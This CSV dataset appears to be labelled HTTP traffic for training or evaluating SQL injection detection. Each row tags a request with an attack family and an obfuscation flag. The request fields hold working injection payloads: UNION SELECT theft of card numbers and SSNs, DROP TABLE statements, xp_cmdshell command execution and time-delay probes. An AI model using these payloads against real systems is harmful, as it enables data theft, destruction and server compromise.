time,source_ip,host,method,uri,user_agent,request_body,referer,flow_uid,dup_index,session_id,session_seq,label,attack_family,obfuscated,synthetic_duplicate,forced_unique_nonce,TEMP_benign_augmentation,aug_category
2023-08-11T11:28:21Z,177.188.234.67,37.85.58.9:80,POST,/account/login,Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),username=6689 OR true=true#&password=x,https://www.google.com/,a_CQDNIszw3XWN3FEz9,0,f9c913f84b33,7,1,tautology,False,False,False,,
2023-08-13T15:55:08Z,44.214.106.171,37.85.58.9:80,POST,/api/auth,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",username=4290' Or 'YES'='yeS'/**/&password=x,-,a_CNqTdq1GhE1uvMBSil,0,1dbafeff5892,302,1,tautology,True,False,False,,
2023-08-16T10:14:15Z,116.35.129.17,37.85.58.9:80,POST,/admin/login.php,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",username=admin81'-- comment&password=x,,a_CeP6Lq3cTkC7JAJOnf,0,1d8f5fc45707,31,1,auth_bypass,False,False,False,,
2023-08-10T08:47:34Z,198.92.101.0,37.85.58.9:80,POST,/admin/login.php,"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",username=23' AND 23=9--&password=x,https://www.bing.com/,a_C33ypv1h3N6ton9hti,0,5feeffed1deb,27,1,boolean_blind,False,False,False,,
2023-07-10T04:12:28Z,158.67.185.111,37.85.58.9:80,POST,/login,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",username=admin74%27/*x*/&password=x,,a_CTpKH5iMbiH0jU8Rh,0,7020e8dc40a9,330,1,auth_bypass,True,False,False,,
2023-08-15T06:13:38Z,97.50.240.188,37.85.58.9:80,POST,/portal/login,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36","username=' anD UpdatExmL(1,concaT(0X7E,(SelEcT verSIoN()),0X7E),1)/*X*/&password=x",https://duckduckgo.com/,a_C8vcurOde8gFgFoXc,0,c4463e9f2128,368,1,error_based,True,False,False,,
2023-07-10T04:48:57Z,104.83.80.53,37.85.58.9:80,GET,"/product?term=5785""%20OR%20%271%27=%271%27/**/","Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/124.0.0.0 Safari/537.36",,,a_Cilof522jfscxpHAV7,0,0437664bf8d7,328,1,tautology,True,False,False,,
2023-07-15T18:16:29Z,117.27.128.238,37.85.58.9:80,GET,/product?name=support21'--,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,,https://duckduckgo.com/,a_ChIFPnncVcgUwo9Fe,0,48868df77119,160,1,auth_bypass,False,False,False,,
2023-07-17T12:39:23Z,30.165.111.119,37.85.58.9:80,GET,"/api/items?name="" AND 1=CONVERT(int,(SELECT @@version))/**/","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,,a_C5oMp51efIalnDgQS,0,b5a5667f647d,23,1,error_based,False,False,False,,
2023-07-10T04:12:46Z,158.67.185.111,37.85.58.9:80,GET,/filter?name=OPERaTor%27--,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",,https://www.bing.com/,a_CRyoft1cD4zkodLv2d,0,7020e8dc40a9,331,1,auth_bypass,True,False,False,,
2023-08-09T14:33:01Z,1.136.9.19,37.85.58.9:80,POST,/login,"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/124.0.0.0 Safari/537.36","username=2499"" WAITFOR DELAY '0:0:20'#&password=x",https://duckduckgo.com/,a_CfoJP42a9INJkrBaOd,0,9b6f39fb0712,32,1,time_based_blind,False,False,False,,
2023-07-10T04:12:28Z,158.67.185.111,37.85.58.9:80,GET,/filter?q=1' AND 1=1--,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",,https://duckduckgo.com/,a_CmMQ0C4qHVVamG88Q4,0,7020e8dc40a9,332,1,boolean_blind,False,False,False,,
2023-07-10T04:13:00Z,158.67.185.111,37.85.58.9:80,POST,/account/login,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",username=1467/**/Or/**/x=X--/**/cOmMenT&password=x,,a_C63rxz2hEv0uPBxL52,0,7020e8dc40a9,333,1,tautology,True,False,False,,
2023-08-15T06:13:03Z,97.50.240.188,37.85.58.9:80,GET,/redirect?query=7164' WAITFOR DELAY '0:0:01'/**/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,-,a_CWK92U3WeonHyB5FW2,0,c4463e9f2128,369,1,time_based_blind,False,False,False,,
2023-07-17T03:54:13Z,197.112.31.83,37.85.58.9:80,GET,/product?name=sysadmin49'-- comment,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",,,a_Cf8ytd2EaNHEzcYvxi,0,24ea6fe19031,262,1,auth_bypass,False,False,False,,
2023-07-17T03:53:44Z,200.49.71.103,37.85.58.9:80,POST,/api/auth,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",username=5341;%20DROP%20TABLE%20customers#&password=x,https://www.bing.com/,a_C0UU8H3BH5nIU1dsp5,0,ccdd86bc3838,92,1,stacked_query,True,False,False,,
2023-08-15T06:13:46Z,97.50.240.188,37.85.58.9:80,POST,/api/auth,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36","username="" WAITFOR DELAY '0:0:07'--&password=x",https://www.google.com/,a_Cwqxkp3tUZCAd8MfLe,0,c4463e9f2128,370,1,time_based_blind,False,False,False,,
2023-08-15T06:12:35Z,97.50.240.188,37.85.58.9:80,POST,/portal/login,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36","username=3329' UNION SELECT card_number,cvv FROM admin-- comment&password=x",,a_Centv422IwsxBDSrLc,0,c4463e9f2128,371,1,union_based,False,False,False,,
2023-07-15T18:16:35Z,117.27.128.238,37.85.58.9:80,POST,/admin/login.php,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,"username=' UNION SELECT ssn,dob FROM orders/*x*/&password=x",https://www.bing.com/,a_CKIo5R2sXa880J8FRb,0,48868df77119,161,1,union_based,False,False,False,,
2023-08-15T22:33:28Z,141.94.222.8,37.85.58.9:80,GET,"/lookup?id=' UNION SELECT ssn,dob FROM accounts-- -","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,https://www.google.com/,a_Cit4Uw4Lp37PxN0xtd,0,3d9c8496db09,289,1,union_based,False,False,False,,
2023-08-14T14:43:02Z,28.84.236.197,37.85.58.9:80,GET,"/filter?name=""%20AND%20SLEEP(5)--%20-","Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/124.0.0.0 Safari/537.36",,,a_CPFaff9d4adhgBJZ,0,9cf362c51881,11,1,time_based_blind,True,False,False,,
2023-07-16T02:17:52Z,110.147.12.25,37.85.58.9:80,POST,/signin,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",username=operator76'--&password=x,,a_CpZS8b2NQu19b94gWg,0,59d1871631cb,24,1,auth_bypass,True,False,False,,
2023-07-17T03:54:48Z,197.112.31.83,37.85.58.9:80,GET,/lookup?term=sysadmin89'/*x*/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",,https://www.bing.com/,a_Clb9Rs2ctj9qig89Yc,0,24ea6fe19031,263,1,auth_bypass,False,False,False,,
2023-08-15T06:13:53Z,97.50.240.188,37.85.58.9:80,POST,/account/login,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",username=3578;/**/DROP/**/TABLE/**/customers/**/&password=x,https://www.bing.com/,a_CVILns2IrDJsILOwj8,0,c4463e9f2128,372,1,stacked_query,True,False,False,,
2023-07-17T16:27:09Z,125.146.232.218,37.85.58.9:80,POST,/signin,curl/8.4.0,"username=29"" AND 29=24/*x*/&password=x",-,a_CdsBwr0hmdm0uwRj1,0,3022406ee52b,8,1,boolean_blind,False,False,False,,
2023-08-15T22:33:06Z,141.94.222.8,37.85.58.9:80,POST,/admin/login.php,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36","username=5"" AND 5=5-- comment&password=x",https://duckduckgo.com/,a_CS6B9Z288pAOY4cLu5,0,3d9c8496db09,290,1,boolean_blind,False,False,False,,
2023-07-15T18:15:43Z,161.132.108.214,37.85.58.9:80,POST,/admin/login.php,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36","username=95"" OR 'yes'='yes'#&password=x",https://www.google.com/,a_CFKRXd2NQ8ERQxyfwj,0,fd4081d9b7cf,157,1,tautology,False,False,False,,
2023-08-16T10:14:22Z,116.35.129.17,37.85.58.9:443,POST,/admin/login.php,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",username=4' AND 4=24-- -&password=x,,a_Cprzv727iNNvZm9Z05,0,1d8f5fc45707,32,1,boolean_blind,False,False,False,,
2023-08-09T14:42:07Z,193.109.54.203,37.85.58.9:80,GET,/redirect?q=29' AND 29=9--,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",,https://www.google.com/,a_COAGNi49RdcxNPqfI8,0,4d5ab3cd97c7,7,1,boolean_blind,True,False,False,,
2023-08-13T15:54:59Z,44.214.106.171,37.85.58.9:80,GET,/filter?search=' AND 1=CAST((SELECT @@version) AS int)/**/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,-,a_CaEQAv2HJUM7o8Xlgh,0,1dbafeff5892,303,1,error_based,False,False,False,,
2023-08-13T15:55:21Z,44.214.106.171,37.85.58.9:80,GET,"/search?id=2307"" OR 'true'='true'--","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,https://duckduckgo.com/,a_CWrhPw1wlGv3fZ71jj,0,1dbafeff5892,304,1,tautology,True,False,False,,
2023-08-09T14:33:01Z,1.136.9.19,37.85.58.9:80,GET,/browse?id=7' AND 7=7/**/,"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/124.0.0.0 Safari/537.36",,https://www.google.com/,a_CxfQ9hPUIcM7qxgUf,0,9b6f39fb0712,33,1,boolean_blind,False,False,False,,
2023-08-15T06:12:37Z,97.50.240.188,37.85.58.9:80,GET,/api/items?name=6' AND 6=6--,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,,a_CBvrI62WxkQFGo6zs8,0,c4463e9f2128,373,1,boolean_blind,True,False,False,,
2023-07-10T04:12:36Z,158.67.185.111,37.85.58.9:80,GET,"/filter?redirect="" ANd extracTVaLue(3,cOnCat(0X7e,(SELeCT @@VERsiOn)))/*X*/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",,https://www.bing.com/,a_C3gBVm4KsIYmjY2eF3,0,7020e8dc40a9,334,1,error_based,True,False,False,,
2023-07-15T06:14:57Z,50.146.74.171,37.85.58.9:80,GET,"/product?q="" And 7=coNVErT(iNt,(SeLeCT @@VeRsION))#","Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",,-,a_CtuUWY15Eu11GIH6Bf,0,5ceaf663adae,22,1,error_based,True,False,False,,
2023-07-10T04:12:28Z,158.67.185.111,37.85.58.9:80,GET,/lookup?redirect=aDmin18'/**/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",,,a_CiGAaJ2UoRTN96lXKa,0,7020e8dc40a9,335,1,auth_bypass,True,False,False,,
2023-07-17T03:54:29Z,197.112.31.83,37.85.58.9:80,GET,/product?q=8400 or x=X/**/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",,https://duckduckgo.com/,a_CMx4QgkiBHRlCjhpc,0,24ea6fe19031,264,1,tautology,True,False,False,,
2023-07-10T11:19:44Z,176.191.16.72,37.85.58.9:80,GET,/filter?name=superuser93'#,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,https://www.bing.com/,a_CVbKIxHH1XniRp0Kg,0,50d8cce4c0bd,7,1,auth_bypass,False,False,False,,
2023-08-15T06:12:58Z,97.50.240.188,37.85.58.9:80,POST,/api/auth,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36","username=11""%20AND%2011=11/*x*/&password=x",https://www.google.com/,a_C81mgw1XV5Dv4GIOog,0,c4463e9f2128,374,1,boolean_blind,True,False,False,,
2023-08-15T22:33:49Z,141.94.222.8,37.85.58.9:80,POST,/login,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36","username=' anD 8=cOnvErt(int,(SeLeCt @@VeRsIOn))-- comment&password=x",,a_Cdpsy33qeLBA8RUDPk,0,3d9c8496db09,291,1,error_based,True,False,False,,
2023-07-10T12:14:37Z,124.204.242.186,37.85.58.9:80,GET,/product?query=7528' AND SLEEP(4)-- comment,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,https://www.bing.com/,a_CXXWvf1Pg21g8G5G58,0,afcb15864799,29,1,time_based_blind,False,False,False,,
2023-08-12T01:14:45Z,124.194.77.145,37.85.58.9:80,POST,/account/login,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1","username="";%20EXeC%20Xp_CMDsHELl(%27Dir%27)--%20-&password=x",https://duckduckgo.com/,a_CAieulw7EyHKJLYP8,0,a55b7e70f5b1,29,1,stacked_query,True,False,False,,
2023-07-10T04:12:32Z,158.67.185.111,37.85.58.9:80,POST,/account/login,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",username=4021/**/OR/**/x=x/*x*/&password=x,https://www.google.com/,a_CP2Ca82i7LZcZZEuTk,0,7020e8dc40a9,336,1,tautology,True,False,False,,
2023-07-15T00:25:18Z,86.226.220.211,37.85.58.9:80,POST,/portal/login,"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",username=' WAITFOR DELAY '0:0:04'#&password=x,,a_CMViWu2TswIJWOCYgg,0,29f3f4a01035,24,1,time_based_blind,False,False,False,,
2023-07-15T18:16:30Z,117.27.128.238,37.85.58.9:80,GET,/redirect?ref=sysadmin55'/**/,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,,,a_CUVN1L1cagyP7YOG0i,0,48868df77119,162,1,auth_bypass,False,False,False,,
2023-07-15T18:16:31Z,117.27.128.238,37.85.58.9:80,GET,"/search?redirect="" AND 4=CAST((SELECT @@version) AS int)#",Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,,-,a_CqiGRnUSSa9p2BeKk,0,48868df77119,163,1,error_based,False,False,False,,
2023-08-13T16:19:06Z,57.68.225.132,37.85.58.9:80,GET,"/filter?name=""; Exec XP_CmdSHelL('ID')/*X*/","Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",,,a_CgWcRn4to54v2uF6Fk,0,1a580da96628,29,1,stacked_query,True,False,False,,
2023-08-15T22:32:50Z,141.94.222.8,37.85.58.9:80,POST,/login,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",username=6917 Or x=X#&password=x,https://www.google.com/,a_CvR6Nf44u4wuY3ELPh,0,3d9c8496db09,292,1,tautology,True,False,False,,
2023-07-15T22:38:50Z,94.12.105.219,37.85.58.9:80,GET,"/lookup?redirect=19"" AND 19=19-- comment",Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,,https://duckduckgo.com/,a_C1gSuC2WyHadacczVf,0,ff4b6ba9e33d,36,1,boolean_blind,False,False,False,,
2023-08-10T01:21:31Z,133.206.137.227,37.85.58.9:80,POST,/signin,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,username=7599; dROp taBLe memberS#&password=x,https://duckduckgo.com/,a_ClOpNo1PcrOqqGmun7,0,44186e841d1f,12,1,stacked_query,True,False,False,,
2023-07-17T03:54:23Z,197.112.31.83,37.85.58.9:80,GET,"/redirect?name=4"" AND 4=25-- ComMeNT","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",,,a_CNf5cE2chkNyGWd2Uk,0,24ea6fe19031,265,1,boolean_blind,True,False,False,,
2023-07-10T04:12:28Z,158.67.185.111,37.85.58.9:80,GET,"/filter?id=7258""/**/waitFoR/**/deLay/**/'0:0:12'/*x*/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",,https://www.google.com/,a_Ci7lbF2KNLsE6Tclt1,0,7020e8dc40a9,337,1,time_based_blind,True,False,False,,
2023-07-10T04:49:44Z,104.83.80.53,37.85.58.9:80,POST,/signin,"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/124.0.0.0 Safari/537.36",username=administrator16'#&password=x,https://www.google.com/,a_Cm3xsg4U9lDb3yay9k,0,0437664bf8d7,329,1,auth_bypass,False,False,False,,
2023-07-10T04:13:08Z,158.67.185.111,37.85.58.9:80,GET,"/search?redirect=' ANd EXTRAcTvALue(2,coNCAT(0x7E,(SElect @@VErsiOn)))/**/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",,,a_Cge6CS1fdz6ltZEBS3,0,7020e8dc40a9,338,1,error_based,True,False,False,,
2023-08-15T22:33:46Z,141.94.222.8,37.85.58.9:80,POST,/signin,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",username='/**/OR/**/x=x--&password=x,,a_Cw10tg4hj8WfaYv6Ub,0,3d9c8496db09,293,1,tautology,True,False,False,,
2023-07-10T04:12:28Z,158.67.185.111,37.85.58.9:80,POST,/api/auth,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15","username=""/**/AND/**/9=CONVERT(int,(SELECT/**/@@version))/**/&password=x",https://www.google.com/,a_Cqsf93v8BlDXWKZi,0,7020e8dc40a9,339,1,error_based,True,False,False,,
2023-07-10T04:12:28Z,158.67.185.111,37.85.58.9:80,POST,/login,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15","username=%27/**/UNION/**/SELECT/**/NULL,NULL,NULL,NULL,NULL#&password=x",,a_CLqFpr1Z5ikTGrLTe7,0,7020e8dc40a9,340,1,union_based,True,False,False,,
2023-08-14T22:53:02Z,171.146.31.42,37.85.58.9:80,GET,/search?search=9641' OR 'yes'='yes'/*x*/,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,,https://duckduckgo.com/,a_C2NAbs3gG3ZORraGcf,0,c9fd8f252ce6,9,1,tautology,False,False,False,,
2023-07-10T04:12:28Z,158.67.185.111,37.85.58.9:80,POST,/api/auth,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",username=manager94'--&password=x,,a_C2Rxyv2OBNjsonQBz6,0,7020e8dc40a9,341,1,auth_bypass,False,False,False,,
2023-08-15T22:33:24Z,141.94.222.8,37.85.58.9:80,POST,/admin/login.php,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",username=operator10'--&password=x,,a_CJuyLM3vjZKKUxKKC1,0,3d9c8496db09,294,1,auth_bypass,False,False,False,,
2023-07-10T04:12:28Z,158.67.185.111,37.85.58.9:80,POST,/portal/login,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",username=24' AND 24=27/**/&password=x,https://duckduckgo.com/,a_CJpOiX3VDMwnpXlgUf,0,7020e8dc40a9,342,1,boolean_blind,False,False,False,,
2023-08-10T08:37:23Z,36.36.102.231,37.85.58.9:80,POST,/admin/login.php,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",username=181 OR z=z#&password=x,,a_CvBOSz2UZ8CaStwmC2,0,eb8b8d63d6b0,16,1,tautology,False,False,False,,
2023-07-10T04:49:33Z,104.83.80.53,37.85.58.9:80,GET,/catalog?search=8871 OR x=x/**/,"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/124.0.0.0 Safari/537.36",,https://www.bing.com/,a_CATr0Y2LrZEhycKmt6,0,0437664bf8d7,330,1,tautology,False,False,False,,
2023-08-13T15:55:46Z,44.214.106.171,37.85.58.9:80,POST,/api/auth,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",username=support42'#&password=x,https://www.google.com/,a_CGtoGz310cXnbPd0yc,0,1dbafeff5892,305,1,auth_bypass,False,False,False,,
2023-07-17T09:04:35Z,183.162.61.21,37.85.58.9:80,GET,"/browse?q=12"" AND 12=5#","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",,-,a_CHkpif270Lmdgk1JP1,0,44c6e1d5f31c,24,1,boolean_blind,False,False,False,,
2023-08-14T06:04:47Z,195.196.35.153,37.85.58.9:80,GET,"/redirect?search='/**/UNION/**/sElEcT/**/Id,EMAIl/**/FROM/**/cUStoMers#","Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",,-,a_CrWnSzT4c3kXmKjs4,0,9191ebf4951d,12,1,union_based,True,False,False,,
2023-08-13T15:55:19Z,44.214.106.171,37.85.58.9:80,GET,/filter?redirect=5824; DROP TABLE admin-- comment,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,-,a_CZdhw64eZvZcmhQlq6,0,1dbafeff5892,306,1,stacked_query,False,False,False,,
2023-08-15T22:32:59Z,141.94.222.8,37.85.58.9:80,POST,/account/login,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",username=1' AND 1=1-- comment&password=x,https://www.google.com/,a_C47lhh2o8AxoLtInw9,0,3d9c8496db09,295,1,boolean_blind,False,False,False,,
2023-08-15T22:33:22Z,141.94.222.8,37.85.58.9:80,GET,"/lookup?term=19"" AND 19=21--","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,https://www.bing.com/,a_CuM5N26PZ4VCffgsc,0,3d9c8496db09,296,1,boolean_blind,False,False,False,,
2023-07-15T18:15:28Z,161.132.108.214,37.85.58.9:80,GET,/lookup?redirect=adMiNisTraTor20'/**/,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",,-,a_CYxRXj2Wpo1AZR4Lxl,0,fd4081d9b7cf,158,1,auth_bypass,True,False,False,,
2023-07-10T04:12:29Z,158.67.185.111,37.85.58.9:80,POST,/portal/login,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",username=5822/**/oR/**/Yes=Yes/*X*/&password=x,https://duckduckgo.com/,a_C95eDV1jImjz7wvn54,0,7020e8dc40a9,343,1,tautology,True,False,False,,
2023-07-16T21:57:36Z,77.171.204.128,37.85.58.9:80,POST,/account/login,python-requests/2.31.0,username=3096;/**/DROP/**/TABLE/**/customers#&password=x,-,a_CeKd193GEcMU7Bcd7a,0,3a3756ce2645,34,1,stacked_query,True,False,False,,
